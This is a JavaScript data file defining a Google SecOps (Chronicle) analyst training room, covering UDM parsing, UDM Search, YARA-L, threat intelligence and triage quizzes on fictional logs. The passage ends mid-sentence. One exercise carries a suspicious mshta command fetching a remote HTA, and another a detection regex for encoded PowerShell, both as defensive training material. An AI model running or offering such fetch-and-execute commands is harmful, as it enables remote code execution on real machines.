/**
 * Learning Rooms -- Batch 50
 *
 * Rooms in this batch:
 *  1. google-secops-fundamentals -- Google SecOps (Chronicle) for Analysts
 *
 * SOURCES consulted directly (Google Security Operations documentation,
 * docs.cloud.google.com/chronicle/docs, checked 2026-11-09):
 *  - UDM field list (top-level structures, metadata fields, Process/File/Dns/Http fields)
 *  - UDM usage guide (event types; required fields for PROCESS_LAUNCH, USER_LOGIN,
 *    NETWORK_DNS; failed login security_result.category AUTH_VIOLATION)
 *  - Format log data as UDM / UDM REST reference (principal, target, src, observer,
 *    intermediary, about definitions; SecurityResult.Action enum)
 *  - Default parser reference for Windows Sysmon (Image, ParentImage, CommandLine,
 *    ParentCommandLine, ProcessId, User, Hashes, DestinationIp/Port, QueryName mapping
 *    and the event types for Sysmon event 1, 3, 22)
 *  - UDM search and UDM search best practices (syntax, value types, regex, nocase,
 *    enumerated-field rule, repeated fields, epoch timestamps, time range, Max Results)
 *  - YARA-L 2.0 overview, match, condition, events syntax and windowing logic
 *    (sections, hop / tumbling / sliding windows, 1m to 48h, condition grammar)
 *  - Run a rule against historical data (retrohunt: default one week, range >= match
 *    window, alerting creates a SOAR alert per detection, overflow cases)
 *  - Curated detections and Applied Threat Intelligence (precise vs broad, Status and
 *    Alerting toggles, categories, ATI priorities Active Breach / High / Medium)
 *  - Investigate an asset (Asset view: prevalence graph, insights, low prevalence on
 *    the top private domain <= 10, newly registered via WHOIS, default 2 hour window)
 *  - SOAR cases overview, case playbooks, playbooks overview, Close Case dialog
 *
 * Deliberately left out because it could not be confirmed against the docs: any count
 * of default parsers, licensing detail beyond the ATI Enterprise Plus note, and exact
 * console labels beyond those quoted above.
 *
 * LOG RULES: raw blocks are UDM events written as flat dotted keys (the way the
 * SecOps UDM viewer shows them), vendor "Google SecOps", registered in
 * scripts/log-field-registry.json. No verdict fields. Threat-intel and prevalence
 * context is stated in the scenario text, never in raw. Documentation-range IPs only.
 */

export const roomsBatch50 = [
  {
    "id": "google-secops-fundamentals",
    "title": "Google SecOps (Chronicle) for Analysts",
    "description": "Work inside Google Security Operations like an analyst: read raw logs and UDM events field by field, write the parser's output yourself, write UDM searches, write and debug YARA-L rules (single-event, multi-event and aggregation), judge entities and threat intelligence, scope a case and write its Case Wall note.",
    "difficulty": "intermediate",
    "category": "SIEM",
    "estimatedMinutes": 95,
    "xp": 335,
    "icon": "🧭",
    "prerequisites": [
      "siem-fundamentals",
      "threat-intelligence"
    ],
    "tasks": [
      {
        "type": "reading",
        "id": "gso-r1",
        "heading": "Google SecOps: One Platform, Four Jobs",
        "content": "**What you are looking at.** Google Security Operations (Google SecOps) is Google's cloud platform for security operations. Many analysts still call it by its older name, Chronicle, and the documentation addresses still say \"chronicle\". It joins a SIEM (security information and event management: the system that collects logs, searches them and raises alerts) with a SOAR (security orchestration, automation and response: the system that turns alerts into cases and runs automated playbooks). Threat intelligence and an AI assistant sit on top of both.\n\n### The four jobs\n\n| Job | What it does | Where an analyst meets it |\n|---|---|---|\n| SIEM | Ingests logs, parses them into one schema called UDM (Unified Data Model), stores them, searches them and runs detection rules written in YARA-L | UDM Search, Rules, Detections |\n| SOAR | Groups alerts into cases, keeps a Case Wall (the case's activity log) and runs playbooks (automated step lists) | Cases queue, Case Wall, Playbooks |\n| Threat intelligence | Matches your events against indicators of compromise (IOCs, such as bad domains, IPs and file hashes) curated by Mandiant through Applied Threat Intelligence (ATI), and ships curated detections written by Google Cloud Threat Intelligence | IOC matches, curated rule sets |\n| Gemini | Google's AI model: it can turn an English question into a UDM search and summarize search results | Search bar, Gemini pane |\n\n### Why organizations migrate\n\nTeams leaving an older SIEM usually name the same pains. Every vendor names fields differently, so a rule has to be rewritten for each log source. Searching old data is slow or needs an archive restored first. Alert triage lives in a different tool from detection. Google SecOps answers each one by design: a single schema for every source, a search that reaches back as far as the tenant's log retention allows (the UDM search time range tops out at 365 days and is always bounded by the retention setting), and SIEM and SOAR in one console.\n\nMigration is still real work. Every parser, rule and integration has to be mapped and tested, and the list of supported log types and default parsers is published in a reference page. Check that list before you promise that a source is covered.\n\n### A log's journey\n\nFollow one event. A laptop writes a Sysmon event. A feed or forwarder delivers it to SecOps tagged with its log type. The parser for that log type extracts fields and writes a UDM event. YARA-L rules and your searches read UDM events, not the raw text. A rule match becomes a detection, the alert reaches SOAR, SOAR groups alerts that share entities into a case, and a playbook can enrich the case and take actions.\n\n### What an analyst asks\n\n- Which log source produced this event, and was it parsed or only stored raw?\n- Which part of the platform am I in (search, detection or case)? The same event looks different in each.\n- What is the time range? Every answer is bounded by it.\n- If Gemini wrote the query, does the query say what I meant? Treat generated queries as drafts and read them before trusting the results.",
        "diagram": "flowchart LR\n  A[Laptop writes a Sysmon event] --> B[Feed delivers it with a log type]\n  B --> C[Parser writes a UDM event]\n  C --> D[UDM Search]\n  C --> E[YARA-L rule]\n  E --> F[Detection and alert]\n  F --> G[SOAR case]\n  G --> H[Playbook]",
        "diagramCaption": "One event's journey through Google SecOps",
        "checkpoint": {
          "question": "What always bounds how far back a UDM Search can reach?",
          "options": [
            "The tenant's log-retention configuration, within the 365-day UDM search maximum",
            "The number of detection rules enabled in the tenant when the search is run",
            "The size of the result table, which is always cut off at one thousand rows",
            "The age of the oldest parser version installed for each ingested log type"
          ],
          "answer": 0,
          "explanation": "The documentation says a search's maximum range is always bounded by the tenant's log-retention configuration, and the UDM search maximum is 365 days. The number of enabled rules has no effect on search range. The row cap is a separate Max Results setting (1k, 30k, 100k or 1M, default 30k), not a time limit. Parser versions affect how events were written, not how far back you may search."
        }
      },
      {
        "type": "reading",
        "id": "gso-r2",
        "heading": "From Raw Log to UDM Event",
        "content": "**The idea.** A raw log is whatever a product wrote: a Sysmon XML record, a firewall syslog line, a JSON audit entry. Every vendor names things differently. A parser reads one log type and writes a UDM event, which has the same named slots for every source. You search and write rules against the slots, so one query covers every vendor. Parsers apply as logs are ingested: a parser change is not applied retroactively to events already stored.\n\n### The shape of a UDM event\n\n| Structure | What it holds |\n|---|---|\n| metadata | What kind of event, when and from where: event_timestamp, event_type, product_event_type, ingested_timestamp, log_type |\n| principal | The acting entity that originates the activity |\n| target | The entity being referenced or acted on |\n| src | The source entity being acted upon, for example the machine a file is copied from |\n| intermediary | Systems the activity passes through, such as a proxy or a mail relay |\n| observer | A device that watches and reports without being in the path, such as a packet sniffer or a vulnerability scanner |\n| about | Other entities the event mentions, such as an email attachment or a DLL loaded during a process launch |\n| network, security_result | Protocol, DNS and HTTP detail; what the source product concluded (action, severity, rule_name) |\n\n### metadata.event_type decides the rest\n\nThe event type tells you which other fields must exist. Process events include PROCESS_LAUNCH, PROCESS_OPEN and PROCESS_INJECTION. Network events include NETWORK_CONNECTION, NETWORK_DNS and NETWORK_HTTP. User events include USER_LOGIN, USER_LOGOUT and USER_RESOURCE_ACCESS. There are also file, registry, service, scheduled task and email families.\n\n- PROCESS_LAUNCH needs a machine identifier in principal and the launched process in target.process.\n- USER_LOGIN needs target.user. Principal is set only for remote activity, so a local keyboard logon leaves it unset. A failed login adds a security_result with category AUTH_VIOLATION.\n- NETWORK_DNS needs network.application_protocol set to DNS and the queried name in network.dns.questions.name.\n\n### Worked example: Sysmon event 1, 3 and 22\n\nThe default Sysmon parser maps by event ID. On event 1 (process creation) the new process lands in target and its parent in principal. On event 3 (network connection) the process that connected is the principal and the far end is the target.\n\n| Sysmon field | UDM field | Event IDs |\n|---|---|---|\n| Image | target.process.file.full_path | 1 |\n| Image | principal.process.file.full_path | 3 and 22 (and others) |\n| ParentImage | principal.process.file.full_path | 1 |\n| CommandLine | target.process.command_line | 1 |\n| ParentCommandLine | principal.process.command_line | 1 |\n| User | principal.user.userid | any except 24 |\n| DestinationIp, DestinationPort | target.ip, target.port | 3 |\n| QueryName | network.dns.questions.name | 22 |\n\nThe same field name can land in a different place depending on the event, which is why you always check the event type first. If a field you expect is empty in UDM, open the raw log: the source may carry it while the parser does not map it.\n\n### What an analyst asks\n\n- Is the value I need in principal or target for this event type?\n- Which event type am I filtering on?\n- Does the UDM event agree with the raw log?",
        "codeExample": "metadata.event_timestamp   = 2026-11-03T09:14:22Z\nmetadata.event_type        = NETWORK_CONNECTION\nmetadata.product_event_type = 3\nprincipal.hostname         = kf-ws-0230\nprincipal.user.userid      = d.salazar\nprincipal.process.file.full_path = C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\ntarget.ip                  = 198.51.100.20\ntarget.port                = 443",
        "checkpoint": {
          "question": "On a USER_LOGIN for someone typing at a server's own keyboard, which noun identifies the person?",
          "options": [
            "target.user, because principal is left unset for local activity",
            "principal.user, because the person is the actor in the event",
            "src.user, because the account is the source of the credentials",
            "observer.user, because the server watched the logon happen"
          ],
          "answer": 0,
          "explanation": "For USER_LOGIN the user being logged on is target.user, and principal is populated only for remote activity, so a local logon leaves it unset. principal.user would be the wrong place for a local logon. src is for the source object of an action such as a file copy. observer describes a separate device that reports without being in the path."
        }
      },
      {
        "type": "query_fill",
        "id": "gso-qf1",
        "heading": "Be the Parser: Write the UDM Event",
        "language": "udm",
        "context": "Kestrel's EDR team forwarded a Sysmon event 1 from kf-ws-0350 and asked what the UDM event will look like once the default Sysmon parser has written it. Raw values: Image C:\\Windows\\System32\\mshta.exe, ParentImage C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE, CommandLine mshta.exe https://kf-docs-share.example/view.hta, User KESTREL\\r.ito. Fill in the event type and the UDM field name on each line. Type field names in full, for example principal.hostname.",
        "template": "metadata.event_type              = \"{{et}}\"\nmetadata.product_event_type      = \"1\"\nprincipal.hostname               = \"kf-ws-0350\"\n{{f_user}} = \"r.ito\"\n{{f_parent}} = \"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"\n{{f_child}} = \"C:\\Windows\\System32\\mshta.exe\"\n{{f_cmd}} = \"mshta.exe https://kf-docs-share.example/view.hta\"",
        "blanks": [
          {
            "id": "et",
            "answers": [
              "PROCESS_LAUNCH"
            ],
            "placeholder": "event type for Sysmon event 1"
          },
          {
            "id": "f_user",
            "answers": [
              "principal.user.userid"
            ],
            "placeholder": "field for the account that ran it"
          },
          {
            "id": "f_parent",
            "answers": [
              "principal.process.file.full_path"
            ],
            "placeholder": "field for the parent process's path"
          },
          {
            "id": "f_child",
            "answers": [
              "target.process.file.full_path"
            ],
            "placeholder": "field for the new process's path"
          },
          {
            "id": "f_cmd",
            "answers": [
              "target.process.command_line"
            ],
            "placeholder": "field for the new process's command"
          }
        ],
        "explanation": "Sysmon event 1 becomes a PROCESS_LAUNCH. The new process (mshta.exe) is what was acted on, so its path and command line go to target.process.file.full_path and target.process.command_line. The parent that did the launching (OUTLOOK.EXE) is the actor, so it goes to principal.process.file.full_path, and the account that ran it goes to principal.user.userid. Getting this right is what makes your later searches and rules work: a rule that reads principal.process.command_line here would be reading Outlook's command line, not mshta's. An Office mail client launching mshta.exe with a remote .hta address is worth a search of its own.",
        "xp": 20
      },
      {
        "type": "log_analysis",
        "id": "gso-la0",
        "heading": "Read a UDM Event: A Failed Logon",
        "context": "The SecOps event viewer shows the UDM event below. It is one of 41 events with the same principal and target between 07:52 and 07:58 UTC. kf-fs-02 is a Kestrel file server, svc_backup is the backup service account, and kf-ws-0417 is a Customer Service workstation. Read the fields, not the alert title.",
        "event": {
          "id": "evt-gso-la0-001",
          "ts": "2026-11-05T07:55:12.000Z",
          "source": "windows",
          "vendor": "Google SecOps",
          "event_type": "auth_failure",
          "severity": "medium",
          "hostname": "kf-fs-02",
          "src_ip": "10.40.9.17",
          "description": "UDM USER_LOGIN event written by the Windows event log parser.",
          "raw": {
            "metadata.event_timestamp": "2026-11-05T07:55:12Z",
            "metadata.event_type": "USER_LOGIN",
            "metadata.product_event_type": "4625",
            "metadata.product_name": "Microsoft-Windows-Security-Auditing",
            "metadata.log_type": "WINEVTLOG",
            "principal.hostname": "kf-ws-0417",
            "principal.ip": "10.40.9.17",
            "target.hostname": "kf-fs-02",
            "target.user.userid": "svc_backup",
            "extensions.auth.type": "MACHINE",
            "extensions.auth.mechanism": "NETWORK",
            "security_result.action": "FAIL",
            "security_result.category": "AUTH_VIOLATION"
          }
        },
        "questions": [
          {
            "question": "Which account was someone trying to log on as?",
            "options": [
              "svc_backup, from target.user.userid, because on USER_LOGIN the account being logged on is the target",
              "kf-ws-0417, from principal.hostname, because principal always names the user in a logon event",
              "kf-fs-02, from target.hostname, because the target of a logon is always an account name",
              "Nobody can tell, because a failed logon never records the account that was tried"
            ],
            "answer": 0,
            "explanation": "For USER_LOGIN the user being authenticated is target.user.userid, here svc_backup. principal.hostname is the machine the attempt came from, and target.hostname is the server that received it. Failed logons do record the account that was tried, which is exactly why they are useful.",
            "xp": 10
          },
          {
            "question": "Where did the attempts come from, and how do you know this was a remote logon?",
            "options": [
              "From kf-ws-0417 (10.40.9.17): principal is filled only for remote activity, and the mechanism is NETWORK",
              "From kf-fs-02: the target is where the keyboard was, so the attempts started on the file server",
              "From the backup software: metadata.product_name names the program that typed the password",
              "From outside the company: a 4625 is only written for logons that arrive from the internet"
            ],
            "answer": 0,
            "explanation": "On a USER_LOGIN, principal is populated only for remote activity, and here it names kf-ws-0417 at 10.40.9.17. extensions.auth.mechanism NETWORK confirms a network logon. kf-fs-02 is the target that received the attempts. metadata.product_name is the Windows auditing source that wrote the log, not the program that tried the password. 4625 is written for any failed logon, internal or external.",
            "xp": 10
          },
          {
            "question": "You want every event in this burst. Which UDM Search returns them?",
            "options": [
              "metadata.event_type = \"USER_LOGIN\" AND security_result.action = \"FAIL\" AND target.user.userid = \"svc_backup\" AND principal.hostname = \"kf-ws-0417\"",
              "metadata.event_type = \"USER_LOGIN\" AND security_result.action = \"BLOCK\" AND principal.user.userid = \"svc_backup\" AND principal.hostname = \"kf-ws-0417\"",
              "metadata.event_type = /USER_.*/ AND security_result.action = \"FAIL\" AND target.user.userid = \"svc_backup\"",
              "metadata.product_event_type = 4625 AND target.user.userid = svc_backup AND principal.hostname = kf-ws-0417"
            ],
            "answer": 0,
            "explanation": "Copy the values the event actually carries: action FAIL, the account in target.user.userid, the source in principal.hostname. The second query uses BLOCK and puts the account in principal, so it matches nothing here. The third uses a regex on an enumerated field, which is invalid. The fourth leaves the strings unquoted; string values need double quotes. Next step: ask the owner of kf-ws-0417 whether a script on it holds an old svc_backup password, and check whether any attempt in the burst succeeded.",
            "xp": 10
          }
        ]
      },
      {
        "type": "reading",
        "id": "gso-r3",
        "heading": "UDM Search: Asking the Data a Precise Question",
        "content": "**One query shape.** UDM Search is the SIEM search page. Every condition has the form udm-field operator value, for example principal.hostname = \"win-server\". Operators are =, !=, <, >, <= and >=. Join conditions with AND, OR and NOT, and group them with parentheses. AND is assumed if you leave the operator out.\n\n### Write each value the way its type needs\n\n| Type | Write it as | Example |\n|---|---|---|\n| String | Double quotes | principal.hostname = \"kf-ws-0188\" |\n| Enumerated value | Double quotes, exact value | metadata.event_type = \"USER_LOGIN\" |\n| Number | No quotes | network.sent_bytes > 50000000 |\n| Boolean | No quotes | security_result.is_alert = true |\n| Timestamp | Epoch seconds on the .seconds part | metadata.ingested_timestamp.seconds = 1660784400 |\n\nAn ISO date string such as \"2022-08-18T01:00:00Z\" is not valid for a timestamp field.\n\n### Regex and nocase\n\nPut a regular expression between slashes: principal.process.command_line = /powershell/ nocase. The nocase modifier after a value makes the match ignore capitalization, and it works on plain strings too: target.user.userid = \"TIM.SMITH\" nocase. A regex matches anywhere inside the value, so you do not need wildcards at either end. A plain \"=\" with a string is an exact match of the whole value.\n\nTwo limits matter. You cannot use a regex on an enumerated field: metadata.event_type = /NETWORK_*/ is invalid. To match several event types, list each one with OR inside parentheses. And queries with many regular expressions run slower, so prefer exact fields where you can.\n\n### Repeated fields\n\nSome fields hold several values, such as principal.ip. A condition on a repeated field matches an event if any value satisfies it. A search for principal.ip != \"1.2.3.4\" still returns an event that carries both 1.2.3.4 and 5.6.7.8.\n\n### Time range and size\n\nThe time range is not part of the query. You set it with the Time Range control (absolute or relative), and a UDM search can reach back at most 365 days, always bounded by the tenant's retention. Max Results to Return is 1k, 30k, 100k or 1M, default 30k. Narrow the range and use specific UDM fields to keep searches fast.\n\n### Gemini\n\nThe search bar and the Gemini pane can turn an English question into a UDM query. Read the query it wrote: check the event type, the noun (principal or target) and the time range before you trust the results.\n\n### What an analyst asks\n\nWhich event type? Which noun holds the value? Is this field repeated? How wide is the time range, and did the result hit Max Results?",
        "codeExample": "metadata.event_type = \"NETWORK_DNS\"\nAND principal.hostname = \"kf-ws-0231\" nocase\nAND network.dns.questions.name = /\\.(top|xyz)$/ nocase",
        "checkpoint": {
          "question": "Where do you set how far back a UDM Search looks?",
          "options": [
            "With the Time Range control, not with a field inside the query",
            "With a metadata.event_timestamp condition added to the query text",
            "With the Max Results to Return setting, which sets the number of days",
            "With the nocase modifier, which widens the search to older events"
          ],
          "answer": 0,
          "explanation": "The range is chosen with the Time Range control (absolute or relative). A timestamp condition filters on event times inside that range but does not set the range. Max Results only caps how many events are returned (1k, 30k, 100k or 1M), not how many days. nocase only ignores capitalization when comparing values."
        }
      },
      {
        "type": "query_fill",
        "id": "gso-qf2",
        "heading": "Write the Search: Encoded PowerShell Across the Fleet",
        "language": "udm",
        "context": "Priya wants every PowerShell launch in the company whose own command line carries an encoded-command switch (-enc, -EncodedCommand, in any capitalization), leaving out the jump host kf-adm-01, where the IT team runs signed scripts that way on purpose. Fill in the blanks. You set the time range (last 7 days) with the Time Range control, not in the query.",
        "template": "metadata.event_type = \"{{et}}\"\nAND target.process.file.full_path = /powershell\\.exe$/ nocase\nAND {{field}} = /\\s-e(nc|ncodedcommand)?\\s/ {{mod}}\nAND {{op}} principal.hostname = \"kf-adm-01\"",
        "blanks": [
          {
            "id": "et",
            "answers": [
              "PROCESS_LAUNCH"
            ],
            "placeholder": "event type"
          },
          {
            "id": "field",
            "answers": [
              "target.process.command_line"
            ],
            "placeholder": "the launched process's command line field"
          },
          {
            "id": "mod",
            "answers": [
              "nocase"
            ],
            "placeholder": "ignore capitalization"
          },
          {
            "id": "op",
            "answers": [
              "NOT"
            ],
            "placeholder": "exclude"
          }
        ],
        "explanation": "The launched process is target.process, so its own command line is target.process.command_line; principal.process.command_line would be the parent's. A regex between slashes matches anywhere inside the value, and nocase makes -ENC and -enc both count. NOT removes the IT jump host, and AND joins the conditions (it is also assumed if you leave it out). You cannot put a regex on metadata.event_type because it is an enumerated field, so the event type is an exact quoted value. Read the results by principal.process.file.full_path next: PowerShell started by an Office application is the row to open first.",
        "xp": 20
      },
      {
        "type": "flag",
        "id": "gso-f1",
        "prompt": "Read the search results and answer: which hostname looked up the most lookalike domains?\n\nSearch: metadata.event_type = \"NETWORK_DNS\" AND network.dns.questions.name = /kestrel.*freight/ nocase\nTime range: 08:30 to 09:30 UTC. Kestrel Freight's real domain is kestrelfreight.example. Do not count it.\n\ntime | principal.hostname | principal.user.userid | network.dns.questions.name\n08:41:07 | kf-ws-0231 | m.petrov | kestrelfreight.example\n08:43:19 | kf-ws-0274 | o.mwangi | kestrel-freight-login.example\n08:43:52 | kf-ws-0190 | s.dube | kestrelfreight.example\n08:47:30 | kf-ws-0274 | o.mwangi | kestrel-freight-login.example\n08:52:11 | kf-ws-0302 | t.baptiste | kestrelfreight-portal.example\n08:55:48 | kf-ws-0231 | m.petrov | kestrelfreight.example\n08:58:44 | kf-ws-0274 | o.mwangi | kestrelfreight-portal.example\n09:03:05 | kf-ws-0302 | t.baptiste | kestrelfreight-portal.example\n09:04:40 | kf-ws-0231 | m.petrov | kestrelfreight.example\n09:10:16 | kf-ws-0231 | m.petrov | kestrel-freight-login.example\n\nAnswer with the hostname.",
        "answer": "kf-ws-0274",
        "hint": "Cross out the rows for the real domain first, then count what is left for each hostname.",
        "event": null,
        "xp": 15
      },
      {
        "type": "reading",
        "id": "gso-r4",
        "heading": "Entities, Prevalence and Threat Intelligence",
        "content": "**Entities.** Besides events, SecOps keeps context about the things events mention: assets (a hostname, IP or MAC address), users, IP addresses, domains and file hashes. Each has a view. Opening one asks \"what do we know about this thing, over time, and how unusual is it?\"\n\n### Asset view\n\nAsset view shows one asset's activity in a time window. The default window is two hours and the time slider moves between one minute and one day. Key parts:\n\n| Part | What it tells you |\n|---|---|\n| Timeline sidebar | The asset's events in order |\n| Prevalence graph | How many assets in your enterprise connected to each domain over the past seven days. Large gray circles mark first connections, red triangles mark alerts |\n| Domains sidebar | The first lookup of each distinct domain in the window, which filters out routine repeats |\n| Insight blocks | Newly registered domains (WHOIS says registered within the past 30 days), domains new to the enterprise, low prevalence domains, and forwarded alerts from other tools |\n\nThe low prevalence insight is based on the top private domain (for example the \"example.com\" part of \"a.b.example.com\") having a prevalence of 10 or less. A subdomain can be flagged because its parent domain is rare.\n\n### Low prevalence is a lead, not a verdict\n\nRare means \"few of us have been there\". A new software vendor, a conference site or a supplier's portal is rare too. The question is what else is true: what process asked, whether the domain is newly registered, whether anyone approved it.\n\n### Threat intelligence matches\n\nApplied Threat Intelligence (ATI) compares your UDM events with Mandiant-curated indicators (domains, IPs, file hashes and URLs). Each match carries a priority: Active Breach (indicators Mandiant observed in active or past compromises), High (linked by Google Threat Intelligence to threat actors or malware but not seen in Mandiant investigations) and Medium (a Malicious verdict with High severity). Alerts come from Active Breach and High matches, and Medium is best run in non-alerting mode first because of the volume. For network indicators, High and Medium match outbound traffic. The ATI rule sets need the Enterprise Plus license.\n\nCareful: \"prevalence\" appears in two places with different meanings. In Asset view it counts your own assets. Inside ATI scoring it means commonly observed by Mandiant.\n\nThe IOC matches page lists each match with its type, priority, status, assets, campaigns, sources and first and last seen times.\n\n### Shared infrastructure\n\nAn IP indicator can sit on shared hosting or a content delivery network (CDN). If dozens of your own assets reach the same address for a known vendor, a match on the IP alone may describe the neighbour, not the traffic.\n\n### What an analyst asks\n\nWhich process made the connection? How many of our assets did the same? What does the IOC match actually match: a domain, a hash or only an IP? Is there an approved change that explains it?",
        "checkpoint": {
          "question": "In Asset view, what does a domain's prevalence count?",
          "options": [
            "Assets in your own enterprise that connected to the domain over the past seven days",
            "Mandiant customers worldwide that have ever been contacted by that domain",
            "Alerts raised by third-party tools that mention the domain in the last two hours",
            "Rule sets in the tenant whose detections reference the domain in their events"
          ],
          "answer": 0,
          "explanation": "Asset view prevalence is the number of assets in your enterprise connected to the domain over the past seven days. The worldwide, Mandiant-observed notion is a separate ATI scoring feature. Forwarded alerts appear as their own insight and have nothing to do with prevalence. Rule sets do not contribute to a domain's prevalence."
        }
      },
      {
        "type": "analyst_choice",
        "id": "gso-ac1",
        "heading": "Triage: A Rare Domain in Asset View",
        "scenario": "You open Asset view for kf-lt-0612, a Procurement laptop used by j.petrov. The Domains sidebar flags files-edge-update.example with the low prevalence insight: one asset in the enterprise (this one) connected to it over the past seven days, and the newly registered insight also fires. The IOC matches page lists the same domain with Applied Threat Intelligence priority High. The lookup repeats every few minutes and began at 13:05. No software deployment ticket mentions the domain. The event below is one of those lookups. What is your verdict?",
        "event": {
          "id": "evt-gso-ac1-001",
          "ts": "2026-11-04T13:27:41.000Z",
          "source": "dns",
          "vendor": "Google SecOps",
          "event_type": "dns_query",
          "severity": "medium",
          "hostname": "kf-lt-0612",
          "user_title": "Procurement Analyst",
          "user": {
            "full_name": "J. Petrov",
            "email": "j.petrov@kestrelfreight.example",
            "department": "Procurement"
          },
          "dns": {
            "query": "files-edge-update.example",
            "query_type": "A"
          },
          "description": "UDM NETWORK_DNS event for kf-lt-0612 surfaced from Asset view.",
          "raw": {
            "metadata.event_timestamp": "2026-11-04T13:27:41Z",
            "metadata.event_type": "NETWORK_DNS",
            "metadata.product_event_type": "22",
            "principal.hostname": "kf-lt-0612",
            "principal.asset.hostname": "kf-lt-0612",
            "principal.user.userid": "j.petrov",
            "principal.process.pid": "6844",
            "principal.process.file.full_path": "C:\\Users\\j.petrov\\AppData\\Roaming\\SyncAgent\\syncagent.exe",
            "network.application_protocol": "DNS",
            "network.dns.questions.name": "files-edge-update.example"
          }
        },
        "correct_verdict": "true_positive",
        "explanation": "Several independent signals agree. Applied Threat Intelligence priority High means Google Threat Intelligence links the indicator to threat actors or malware. Prevalence of one plus a newly registered domain says nobody else in the company has any reason to visit it. The principal.process.file.full_path is an executable in the user's roaming profile, not an approved application directory, and the lookups repeat on a schedule with no change ticket. Together that is the shape of a program calling out to infrastructure, so the right next steps are to contain kf-lt-0612, search UDM for every other asset that resolved the domain, and open a case. Low prevalence alone would not have justified this, which is why you read the rest.",
        "xp": 20
      },
      {
        "type": "analyst_choice",
        "id": "gso-ac2",
        "heading": "Triage: An IOC Match on a Shared Address",
        "scenario": "The tenant has alerting switched on for the Medium priority Applied Threat Intelligence rule set, and it just alerted on kf-ws-0140, a Finance workstation used by a.fontaine. The IOC matches page shows IP address 198.51.100.40 with priority Medium. The IP address view shows 58 enterprise assets reached this address over the past seven days. The event below is the connection that matched. Choose your verdict.",
        "event": {
          "id": "evt-gso-ac2-001",
          "ts": "2026-11-05T08:52:10.000Z",
          "source": "proxy",
          "vendor": "Google SecOps",
          "event_type": "http_request",
          "severity": "medium",
          "hostname": "kf-ws-0140",
          "user_title": "Finance Analyst",
          "user": {
            "full_name": "A. Fontaine",
            "email": "a.fontaine@kestrelfreight.example",
            "department": "Finance"
          },
          "src_ip": "10.40.6.140",
          "dst_ip": "198.51.100.40",
          "dst_port": 443,
          "network": {
            "domain": "updates.ledgerworks.example",
            "method": "GET",
            "status": 200,
            "user_agent": "LedgerWorks-Updater/9.4.1 (Windows NT 10.0)"
          },
          "description": "UDM NETWORK_HTTP event matched by an Applied Threat Intelligence IOC rule.",
          "it_verify_result": "confirmed",
          "it_verify_message": "IT: LedgerWorks 9.4.1 is the approved finance application and its update was rolled out to Finance this week.",
          "raw": {
            "metadata.event_timestamp": "2026-11-05T08:52:10Z",
            "metadata.event_type": "NETWORK_HTTP",
            "principal.hostname": "kf-ws-0140",
            "principal.ip": "10.40.6.140",
            "principal.user.userid": "a.fontaine",
            "principal.process.file.full_path": "C:\\Program Files\\LedgerWorks\\LedgerWorks.exe",
            "target.hostname": "updates.ledgerworks.example",
            "target.ip": "198.51.100.40",
            "target.port": 443,
            "network.http.method": "GET",
            "network.http.response_code": 200,
            "network.http.user_agent": "LedgerWorks-Updater/9.4.1 (Windows NT 10.0)"
          }
        },
        "correct_verdict": "false_positive",
        "explanation": "The rule matched an IP address, but the activity is not what the intelligence is about. The traffic comes from a LedgerWorks executable in Program Files, asks the vendor's own update host name for a normal GET, receives a 200, and 58 of your own assets use the same address, which is what a shared hosting or content delivery address looks like. IT confirms the application and its rollout. Close the alert, and fix the cause rather than the rule: add an exclusion or suppression for this destination and keep the Medium rule set in non-alerting mode until its volume is understood.",
        "fp_trap": "Why it looks bad: an Applied Threat Intelligence match on a Finance workstation sounds like an indicator of compromise, and Medium priority still means Google linked the indicator to a Malicious verdict. What breaks the case is the context: the match is on an IP, not on the vendor's domain, that IP is shared by 58 of your own assets, the process is a signed-vendor path with a matching user agent, and IT confirms the update. A shared address inherits the reputation of its worst neighbour, so an IP-only match needs its host name and process checked before escalation.",
        "xp": 25
      },
      {
        "type": "reading",
        "id": "gso-r5",
        "heading": "YARA-L 2.0, Retrohunt and Curated Detections",
        "content": "**What YARA-L is.** YARA-L 2.0 is the language of Google SecOps detection rules. A rule watches incoming UDM events and raises a detection when its logic is met. A single-event rule has no match window. A multi-event rule joins events over a window.\n\n### Rule anatomy\n\n| Section | Job |\n|---|---|\n| meta | Descriptive fields: author, description, severity |\n| events | Declares event variables such as $e and filters them with UDM fields. Placeholder variables such as $user tie events together |\n| match | Groups events by variables over a time window |\n| outcome | Calculates values per detection, for example count() |\n| condition | Decides when the rule fires, for example #fail >= 5 |\n\nA rule needs meta, events and condition. The order is meta, events, match, outcome, condition.\n\n### Windows\n\n\"over 15m\" creates a hop window: fixed, overlapping windows whose alignment SecOps chooses, with the condition checked inside each one. \"by day\" creates a tumbling window: non-overlapping blocks where each event belongs to exactly one. \"over 5m after $e1\" creates a sliding window anchored to a pivot event, for strict sequences, in rules only. Duration is 1 minute to 48 hours (units m, h, d). To enforce order between events, compare timestamps in the events section, as in the example below.\n\n### Conditions\n\n#fail counts the events bound to $fail. A bare $success means at least one such event exists. Join conditions with and. A rule that needs an event not to exist adds an hour of latency, to allow for late data.\n\n### The building blocks you will type\n\n| You want | You write |\n|---|---|\n| A field on an event | $e.target.process.file.full_path (the event variable, then the UDM path) |\n| Two events about the same thing | The same placeholder on both: $fail.target.user.userid = $user and $success.target.user.userid = $user |\n| Group by that thing over time | match: $user over 15m (the match variable must be a placeholder from events) |\n| Order: B after A | $b.metadata.event_timestamp.seconds > $a.metadata.event_timestamp.seconds |\n| A number per detection | outcome: $n = count($e.metadata.id), or count_distinct(), sum(), max(), min() |\n| A threshold | condition: #e >= 5, or an outcome variable such as $n > 15 |\n| One event is enough | No match section, and condition: $e |\n\nIn a multi-event rule (one with a match section), every outcome value must come from an aggregation function, because one detection covers many events. Regexes work the same way as in UDM Search: /pattern/ nocase.\n\n**Brute force or spray?** Many failures for one account is a brute force: group by the account and count events. Failures from one source across many accounts is a spray: group by the source IP and count_distinct the accounts. The two rules look alike and catch different attacks.\n\n**Test before you trust.** After writing a rule, search UDM for an event you know should match and compare every field in the rule with it. The most common reason a new rule never fires is a field read from principal when the value lives in target, or the reverse.\n\n### Retrohunt\n\nA retrohunt runs a rule over stored history to find threats you had not detected. The default range is one week, and for a multi-event rule the range must be at least the match window. If the rule has alerting enabled, a retrohunt creates a SOAR alert for every detection it finds, and large volumes can create overflow cases. Run it with alerting disabled, or make a new rule version, to avoid that.\n\n### Curated detections\n\nGoogle Cloud Threat Intelligence (GCTI) maintains curated detections: YARA-L 